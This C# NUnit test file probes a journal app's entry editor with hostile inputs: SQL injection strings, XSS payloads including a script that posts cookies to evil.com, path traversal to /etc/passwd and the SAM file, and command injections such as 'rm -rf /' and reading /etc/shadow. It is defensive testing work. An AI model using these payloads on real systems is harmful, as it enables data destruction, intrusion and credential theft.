using NUnit.Framework;
using Sophic.ViewModels;
using Sophic.Models;
using Sophic.Services;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace Sophic.SecurityTests
{
    [TestFixture]
    public class EntryEditorPenetrationTests
    {
        private EntryEditorViewModel _viewModel;
        private CategoryService _categoryService;
        private LocalStorageService _localStorageService;

        [SetUp]
        public void Setup()
        {
            // Initialize services
            _localStorageService = new LocalStorageService();
            _categoryService = new CategoryService(_localStorageService);

            // Create test entry with clean data
            var testEntry = new JournalEntry
            {
                Id = 1,
                Title = "Test Entry",
                Content = "Test content",
                CreatedAt = DateTime.Now,
                UpdatedAt = DateTime.Now,
                Tags = "test",
                Category = "General",
                Mood = "neutral"
            };

            _viewModel = new EntryEditorViewModel(_categoryService, testEntry);
        }

        #region SQL Injection Attack Tests

        [Test]
        public void JournalEntry_Title_SqlInjection_ShouldBeSanitized()
        {
            // Arrange
            var maliciousInputs = new[]
            {
                "'; DROP TABLE JournalEntries; --",
                "' OR '1'='1",
                "'; DELETE FROM Users WHERE 1=1; --",
                "admin'; INSERT INTO Users VALUES('hacker','password'); --",
                "' UNION SELECT * FROM sensitive_data --"
            };

            foreach (var input in maliciousInputs)
            {
                // Act
                _viewModel.Entry.Title = input;

                // Assert
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("DROP TABLE"), 
                    $"SQL injection not sanitized in Title: {input}");
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("DELETE FROM"), 
                    $"SQL injection not sanitized in Title: {input}");
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("INSERT INTO"), 
                    $"SQL injection not sanitized in Title: {input}");
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("UNION SELECT"), 
                    $"SQL injection not sanitized in Title: {input}");
            }
        }

        [Test]
        public void JournalEntry_Content_SqlInjection_ShouldBeSanitized()
        {
            // Arrange
            var maliciousContent = @"
                My journal entry today was great.
                '; DROP TABLE JournalEntries; --
                Just kidding, let's try: ' OR 1=1 --
                Or maybe: '; DELETE FROM Users; --
            ";

            // Act
            _viewModel.Entry.Content = maliciousContent;

            // Assert
            Assert.That(_viewModel.Entry.Content, Does.Not.Contain("DROP TABLE"));
            Assert.That(_viewModel.Entry.Content, Does.Not.Contain("DELETE FROM"));
            Assert.That(_viewModel.Entry.Content, Does.Not.Contain("' OR 1=1"));
        }

        [Test]
        public void JournalEntry_Category_SqlInjection_ShouldBeSanitized()
        {
            // Arrange
            var maliciousCategory = "work'; DROP TABLE Categories; --";

            // Act
            _viewModel.Entry.Category = maliciousCategory;

            // Assert
            Assert.That(_viewModel.Entry.Category, Does.Not.Contain("DROP TABLE"));
            Assert.That(_viewModel.Entry.Category, Does.Not.Contain("'; "));
        }

        #endregion

        #region XSS Attack Tests

        [Test]
        public void JournalEntry_Title_XSSAttack_ShouldBeSanitized()
        {
            // Arrange
            var xssPayloads = new[]
            {
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input type=\"text\" onkeyup=\"alert('XSS')\">"
            };

            foreach (var payload in xssPayloads)
            {
                // Act
                _viewModel.Entry.Title = payload;

                // Assert
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("<script"), 
                    $"XSS not sanitized in Title: {payload}");
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("javascript:"), 
                    $"XSS not sanitized in Title: {payload}");
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("onerror="), 
                    $"XSS not sanitized in Title: {payload}");
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("onload="), 
                    $"XSS not sanitized in Title: {payload}");
            }
        }

        [Test]
        public void JournalEntry_Content_XSSAttack_ShouldBeSanitized()
        {
            // Arrange
            var maliciousContent = @"
                <p>Normal content here</p>
                <script>
                    // Malicious script
                    fetch('http://evil.com/steal', {
                        method: 'POST',
                        body: JSON.stringify(document.cookie)
                    });
                </script>
                <img src='x' onerror='alert(""Pwned"")'>
            ";

            // Act
            _viewModel.Entry.Content = maliciousContent;

            // Assert
            Assert.That(_viewModel.Entry.Content, Does.Not.Contain("<script"));
            Assert.That(_viewModel.Entry.Content, Does.Not.Contain("fetch("));
            Assert.That(_viewModel.Entry.Content, Does.Not.Contain("onerror="));
        }

        [Test]
        public void JournalEntry_Tags_XSSAttack_ShouldBeSanitized()
        {
            // Arrange
            var maliciousTags = "<script>alert('tag hack')</script>, normal-tag, <img onerror=alert('xss')>";

            // Act
            _viewModel.Entry.Tags = maliciousTags;

            // Assert
            Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("<script"));
            Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("onerror="));
            Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("<img"));
        }

        #endregion

        #region Path Traversal Tests

        [Test]
        public void JournalEntry_Tags_PathTraversal_ShouldBeSanitized()
        {
            // Arrange
            var pathTraversalInputs = new[]
            {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd"
            };

            foreach (var input in pathTraversalInputs)
            {
                // Act
                _viewModel.Entry.Tags = input;

                // Assert
                Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("../"));
                Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("..\\"));
                Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("%2e%2e"));
                Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("etc/passwd"));
                Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("system32"));
            }
        }

        [Test]
        public void JournalEntry_Category_PathTraversal_ShouldBeSanitized()
        {
            // Arrange
            var pathTraversal = "../../../admin/config";

            // Act
            _viewModel.Entry.Category = pathTraversal;

            // Assert
            Assert.That(_viewModel.Entry.Category, Does.Not.Contain("../"));
            Assert.That(_viewModel.Entry.Category, Does.Not.Contain("admin/config"));
        }

        #endregion

        #region Buffer Overflow Tests

        [Test]
        public void JournalEntry_Title_BufferOverflow_ShouldBeTruncatedOrRejected()
        {
            // Arrange - Create extremely long title
            var longTitle = new string('A', 10000); // 10KB title

            // Act
            _viewModel.Entry.Title = longTitle;

            // Assert - Should either be truncated to reasonable length or rejected
            Assert.That(_viewModel.Entry.Title.Length, Is.LessThan(1000), 
                "Title should be truncated to prevent buffer overflow");
        }

        [Test]
        public void JournalEntry_Content_ExtremelyLargeContent_ShouldBeHandledSafely()
        {
            // Arrange - Create massive content (1MB)
            var largeContent = new string('X', 1024 * 1024);

            // Act & Assert - Should not crash or consume excessive memory
            Assert.DoesNotThrow(() => _viewModel.Entry.Content = largeContent);
            
            // Memory usage should be reasonable
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }

        #endregion

        #region Command Injection Tests

        [Test]
        public void JournalEntry_Title_CommandInjection_ShouldBeSanitized()
        {
            // Arrange
            var commandInjectionInputs = new[]
            {
                "test; rm -rf /",
                "test && del /f /s /q C:\\*.*",
                "test | powershell -Command \"Remove-Item -Recurse -Force C:\\\"",
                "test`rm -rf /home/user`",
                "test$(rm -rf /)",
                "test;cat /etc/shadow"
            };

            foreach (var input in commandInjectionInputs)
            {
                // Act
                _viewModel.Entry.Title = input;

                // Assert
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("rm -rf"));
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("del /f"));
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("powershell"));
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("/etc/shadow"));
            }
        }

        [Test]
        public void JournalEntry_Mood_CommandInjection_ShouldBeSanitized()
        {
            // Arrange
            var maliciousMood = "happy; rm -rf /";

            // Act
            _viewModel.Entry.Mood = maliciousMood;

            // Assert
            Assert.That(_viewModel.Entry.Mood, Does.Not.Contain("rm -rf"));
            Assert.That(_viewModel.Entry.Mood, Does.Not.Contain("; "));
        }

        #endregion

        #region Unicode/Encoding Attack Tests

        [Test]
        public void JournalEntry_Title_UnicodeNormalization_ShouldBeHandledSafely()
        {
            // Arrange - Unicode normalization attacks
            var unicodeAttacks = new[]
            {
                "test\u202e\u202d<script>alert('XSS')</script>", // Right-to-left override
                "test\u00A0\u2028\u2029", // Non-breaking space, line separators
                "test\uFEFF", // Zero-width no-break space
                "test\u200B\u200C\u200D", // Zero-width characters
                "caf\u00E9", // Composed character
                "cafe\u0301" // Decomposed character
            };

            foreach (var input in unicodeAttacks)
            {
                // Act
                _viewModel.Entry.Title = input;

                // Assert - Should handle unicode safely
                Assert.That(_viewModel.Entry.Title, Is.Not.Null);
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("\u202e"));
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("\u202d"));
            }
        }

        #endregion

        #region Null Byte Injection Tests

        [Test]
        public void JournalEntry_AllProperties_NullByteInjection_ShouldBeSanitized()
        {
            // Arrange
            var nullByteInputs = new[]
            {
                "normal\0hidden",
                "file.txt\0.exe",
                "category\0admin",
                "tag\0malicious"
            };

            foreach (var input in nullByteInputs)
            {
                // Act & Assert
                _viewModel.Entry.Title = input;
                Assert.That(_viewModel.Entry.Title, Does.Not.Contain("\0"), "Null byte in Title");

                _viewModel.Entry.Content = input;
                Assert.That(_viewModel.Entry.Content, Does.Not.Contain("\0"), "Null byte in Content");

                _viewModel.Entry.Tags = input;
                Assert.That(_viewModel.Entry.Tags, Does.Not.Contain("\0"), "Null byte in Tags");

                _viewModel.Entry.Category = input;
                Assert.That(_viewModel.Entry.Category, Does.Not.Contain("\0"), "Null byte in Category");

                _viewModel.Entry.Mood = input;
                Assert.That(_viewModel.Entry.Mood, Does.Not.Contain("\0"), "Null byte in Mood");
            }
        }

        #endregion

        #region Concurrent Access Tests

        [Test]
        public async Task JournalEntry_ConcurrentPropertyAccess_ShouldNotCauseCorruption()
        {
            // Arrange
            var tasks = new List<Task>();
            var random = new Random();

            // Act - Simulate concurrent access from multiple threads
            for (int i = 0; i < 10; i++)
            {
                var taskId = i;
                tasks.Add(Task.Run(() =>
                {
                    for (int j = 0; j < 100; j++)
                    {
                        _viewModel.Entry.Title = $"Title_{taskId}_{j}";
                        _viewModel.Entry.Content = $"Content_{taskId}_{j}";
                        _viewModel.Entry.Tags = $"tag_{taskId}_{j}";
                        _viewModel.Entry.Category = $"Category_{taskId}_{j}";
                        _viewModel.Entry.Mood = $"mood_{taskId}_{j}";
                        
                        // Random delay to increase chance of race conditions
                        Thread.Sleep(random.Next(1, 5));
                    }
                }));
            }

            // Assert - Should complete without exceptions
            await Task.WhenAll(tasks);
            Assert.That(_viewModel.Entry.Title, Is.Not.Null.And.Not.Empty);
        }

        #endregion

        #region Null/Empty Input Tests

        [Test]
        public void JournalEntry_AllProperties_NullInput_ShouldBeHandledSafely()
        {
            // Act & Assert - Should not throw exceptions
            Assert.DoesNotThrow(() => _viewModel.Entry.Title = null);
            Assert.DoesNotThrow(() => _viewModel.Entry.Content = null);
            Assert.DoesNotThrow(() => _viewModel.Entry.Tags = null);
            Assert.DoesNotThrow(() => _viewModel.Entry.Category = null);
            Assert.DoesNotThrow(() => _viewModel.Entry.Mood = null);

            // Properties should have safe defaults
            Assert.That(_viewModel.Entry.Title ?? "", Is.Not.Null);
            Assert.That(_viewModel.Entry.Content ?? "", Is.Not.Null);
        }

        [Test]
        public void JournalEntry_AllProperties_EmptyInput_ShouldBeHandledSafely()
        {
            // Act & Assert
            Assert.DoesNotThrow(() => _viewModel.Entry.Title = "");
            Assert.DoesNotThrow(() => _viewModel.Entry.Content = "");
            Assert.DoesNotThrow(() => _viewModel.Entry.Tags = "");
            Assert.DoesNotThrow(() => _viewModel.Entry.Category = "");
            Assert.DoesNotThrow(() => _viewModel.Entry.Mood = "");
        }

        #endregion

        #region Memory Exhaustion Tests

        [Test]
        public void JournalEntry_RepeatedLargeInputs_ShouldNotExhaustMemory()
        {
            // Arrange
            var initialMemory = GC.GetTotalMemory(true);
            var largeInput = new string('M', 50000); // 50KB

            // Act - Repeatedly set large inputs
            for (int i = 0; i < 100; i++)
            {
                _viewModel.Entry.Title = largeInput + i;
                _viewModel.Entry.Content = largeInput + i;
                _viewModel.Entry.Tags = largeInput + i;
                _viewModel.Entry.Category = largeInput + i;
                _viewModel.Entry.Mood = largeInput + i;
                
                if (i % 10 == 0)
                {
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                }
            }

            // Assert - Memory should not have grown excessively
            var finalMemory = GC.GetTotalMemory(true);
            var memoryGrowth = finalMemory - initialMemory;
            
            Assert.That(memoryGrowth, Is.LessThan(50 * 1024 * 1024), // Less than 50MB growth
                $"Memory grew by {memoryGrowth / 1024 / 1024}MB, which is excessive");
        }

        #endregion

        #region Entry ID Manipulation Tests

        [Test]
        public void JournalEntry_ID_Manipulation_ShouldBeValidated()
        {
            // Arrange
            var maliciousIds = new[] { -1, int.MaxValue, 0, -999999 };

            foreach (var id in maliciousIds)
            {
                // Act
                _viewModel.Entry.Id = id;

                // Assert - ID should be reasonable
                Assert.That(_viewModel.Entry.Id, Is.GreaterThanOrEqualTo(0), 
                    "Entry ID should not be negative");
                Assert.That(_viewModel.Entry.Id, Is.LessThan(1000000), 
                    "Entry ID should be reasonable size");
            }
        }

        #endregion

        #region DateTime Manipulation Tests

        [Test]
        public void JournalEntry_DateTime_Manipulation_ShouldBeValidated()
        {
            // Arrange
            var maliciousDates = new[]
            {
                DateTime.MinValue,
                DateTime.MaxValue,
                new DateTime(1900, 1, 1),
                new DateTime(2100, 1, 1)
            };

            foreach (var date in maliciousDates)
            {
                // Act & Assert - Should handle extreme dates safely
                Assert.DoesNotThrow(() => _viewModel.Entry.CreatedAt = date);
                Assert.DoesNotThrow(() => _viewModel.Entry.UpdatedAt = date);
                
                // Dates should be reasonable
                Assert.That(_viewModel.Entry.CreatedAt.Year, Is.InRange(1950, 2050),
                    "CreatedAt year should be reasonable");
                Assert.That(_viewModel.Entry.UpdatedAt.Year, Is.InRange(1950, 2050),
                    "UpdatedAt year should be reasonable");
            }
        }

        #endregion

        [TearDown]
        public void TearDown()
        {
            _viewModel = null;
            _categoryService = null;
            _localStorageService = null;
            GC.Collect();
        }
    }
}